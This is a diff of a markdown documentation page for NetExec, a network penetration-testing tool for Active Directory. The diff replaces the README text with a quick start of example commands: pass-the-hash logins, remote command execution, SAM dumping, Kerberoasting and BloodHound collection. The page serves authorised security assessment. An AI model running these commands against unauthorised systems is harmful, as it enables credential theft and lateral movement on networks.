@@ -1,83 +1,116 @@
 ---
-title: "netexec"
+title: "NetExec"
 category: "tool"
-tags: ["tool-documentation"]
-sources:
-  - type: readme
-    url: "https://github.com/Pennyw0rth/NetExec"
-last_updated: "2025-12-26"
+subcategory: "active-directory"
+tags: ["network-exploitation", "smb", "ldap", "winrm", "credential-spraying", "lateral-movement"]
+last_updated: "2025-12-27"
 ---
 
-# netexec
+# NetExec
 
-## README
+## Table of Contents
 
-![Supported Python versions](https://img.shields.io/badge/python-3.10+-blue.svg)
-[![Twitter](https://img.shields.io/twitter/follow/al3xn3ff?label=al3x_n3ff&style=social)](https://twitter.com/intent/follow?screen_name=al3x_n3ff)
-[![Twitter](https://img.shields.io/twitter/follow/_zblurx?label=_zblurx&style=social)](https://twitter.com/intent/follow?screen_name=_zblurx)
-[![Twitter](https://img.shields.io/twitter/follow/MJHallenbeck?label=MJHallenbeck&style=social)](https://twitter.com/intent/follow?screen_name=MJHallenbeck)
-[![Twitter](https://img.shields.io/twitter/follow/mpgn_x64?label=mpgn_x64&style=social)](https://twitter.com/intent/follow?screen_name=mpgn_x64)
+- [Overview](#overview)
+- [Installation](#installation)
+- [Quick Start](#quick-start)
+- [Protocol Modules](#protocol-modules)
+- [Documentation Files](#documentation-files)
+- [Resources](#resources)
 
+## Overview
 
-🚩 This is the open source repository of NetExec maintained by a community of passionate people
-# NetExec - The Network Execution Tool
+NetExec (nxc) is the successor to CrackMapExec, a network service exploitation tool for automating security assessments of large networks. Originally created by @byt3bl33d3r in 2015 as CrackMapExec, the project was renamed to NetExec in 2023 and is now maintained by the community.
 
-This project was initially created in 2015 by @byt3bl33d3r, known as CrackMapExec. In 2019 @mpgn_x64 started maintaining the project for the next 4 years, adding a lot of great tools and features. In September 2023 he retired from maintaining the project.
+Key capabilities:
+- Multi-protocol support (SMB, LDAP, WinRM, MSSQL, SSH, RDP, WMI, FTP, NFS)
+- Password spraying and credential validation
+- Command execution across multiple hosts
+- Active Directory enumeration and exploitation
+- BloodHound integration for attack path mapping
 
-Along with many other contributors, we (NeffIsBack, Marshall-Hallenbeck, and zblurx) developed new features, bug fixes, and helped maintain the original project CrackMapExec.
-During this time, with both a private and public repository, community contributions were not easily merged into the project. The 6-8 month discrepancy between the code bases caused many development issues and heavily reduced community-driven development.
-With the end of mpgn's maintainer role, we (the remaining most active contributors) decided to maintain the project together as a fully free and open source project under the new name **NetExec** 🚀
-Going forward, our intent is to maintain a community-driven and maintained project with regular updates for everyone to use.
+## Installation
 
-<p align="center">
-  <!-- placeholder for nxc logo-->
-</p>
+### Linux (pipx - Recommended)
 
-You are on the **latest up-to-date** repository of the project NetExec (nxc) ! 🎉
-
-- 🚧 If you want to report a problem, open an [Issue](https://github.com/Pennyw0rth/NetExec/issues) 
-- 🔀 If you want to contribute, open a [Pull Request](https://github.com/Pennyw0rth/NetExec/pulls)
-- 💬 If you want to discuss, open a [Discussion](https://github.com/Pennyw0rth/NetExec/discussions)
-
-## Official Discord Channel
-
-If you don't have a Github account, you can ask your questions on Discord!
-
-[![NetExec](https://discordapp.com/api/guilds/1148685154601160794/widget.png?style=banner3)](https://discord.gg/pjwUTQzg8R)
-
-# Documentation, Tutorials, Examples
-See the project's [wiki](https://netexec.wiki/) (in development) for documentation and usage examples
-
-# Installation
-Please see the installation instructions on the [wiki](https://netexec.wiki/getting-started/installation) (in development)
-
-## Linux
-```
+```bash
 sudo apt install pipx git
 pipx ensurepath
 pipx install git+https://github.com/Pennyw0rth/NetExec
 ```
 
-## Availability on Unix distributions
+### Kali Linux
 
-[![Packaging status](https://repology.org/badge/vertical-allrepos/netexec.svg)](https://repology.org/project/netexec/versions)
+```bash
+sudo apt install netexec
+```
 
-# Development
-Development guidelines and recommendations in development
+## Quick Start
 
-# Acknowledgments
-All the hard work and development over the years from everyone in the CrackMapExec project
+### SMB - Check Credentials
 
-# Code Contributors
-Awesome code contributors of NetExec:
+```bash
+# Password authentication
+nxc smb 192.168.1.0/24 -u admin -p 'Password123'
 
-[![](https://github.com/mpgn.png?size=50)](https://github.com/mpgn)
-[![](https://github.com/Marshall-Hallenbeck.png?size=50)](https://github.com/Marshall-Hallenbeck)
-[![](https://github.com/zblurx.png?size=50)](https://github.com/zblurx)
-[![](https://github.com/NeffIsBack.png?size=50)](https://github.com/NeffIsBack)
-[![](https://github.com/Hackndo.png?size=50)](https://github.com/Hackndo)
-[![](https://github.com/XiaoliChan.png?size=50)](https://github.com/XiaoliChan)
-[![](https://github.com/termanix.png?size=50)](https://github.com/termanix)
-[![](https://github.com/Dfte.png?size=50)](https://github.com/Dfte)
+# Hash authentication (pass-the-hash)
+nxc smb 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76
 
+# Execute commands
+nxc smb 192.168.1.100 -u admin -p 'Password123' -x 'whoami'
+```
 
+### WinRM - Remote Command Execution
+
+```bash
+# Check WinRM access
+nxc winrm 192.168.1.100 -u admin -p 'Password123'
+
+# Execute PowerShell commands
+nxc winrm 192.168.1.100 -u admin -p 'Password123' -x 'Get-Process'
+
+# Dump SAM database
+nxc winrm 192.168.1.100 -u admin -p 'Password123' --sam
+```
+
+### LDAP - Active Directory Enumeration
+
+```bash
+# Enumerate domain users
+nxc ldap dc01.domain.local -u user -p 'Password123' --users
+
+# Kerberoasting
+nxc ldap dc01.domain.local -u user -p 'Password123' --kerberoasting output.txt
+
+# ASREPRoasting
+nxc ldap dc01.domain.local -u user -p 'Password123' --asreproast output.txt
+
+# BloodHound collection
+nxc ldap dc01.domain.local -u user -p 'Password123' --bloodhound -c All
+```
+
+## Protocol Modules
+
+| Protocol | Port | Key Features |
+|----------|------|--------------|
+| SMB | 445 | Auth, exec, shares, credential dumping, LAPS |
+| LDAP | 389/636 | User enum, Kerberoasting, ASREPRoast, BloodHound |
+| WinRM | 5985/5986 | Remote PowerShell, credential dumping |
+| MSSQL | 1433 | SQL auth, xp_cmdshell, privilege escalation |
+| SSH | 22 | Auth, command execution, file transfer |
+| RDP | 3389 | Auth check, screenshots |
+| WMI | 135 | Remote execution via WMI |
+| FTP | 21 | Auth, file operations |
+| NFS | 2049 | Share enumeration, file access |
+
+## Documentation Files
+
+| File | Description |
+|------|-------------|
+| [protocols.md](protocols.md) | Complete protocol reference (SMB, LDAP, WinRM, MSSQL, SSH, RDP, WMI) |
+| [official_docs.md](official_docs.md) | Wiki navigation and protocol documentation links |
+
+## Resources
+
+- **Wiki**: https://netexec.wiki/
+- **GitHub**: https://github.com/Pennyw0rth/NetExec
+- **Discord**: https://discord.gg/pjwUTQzg8R
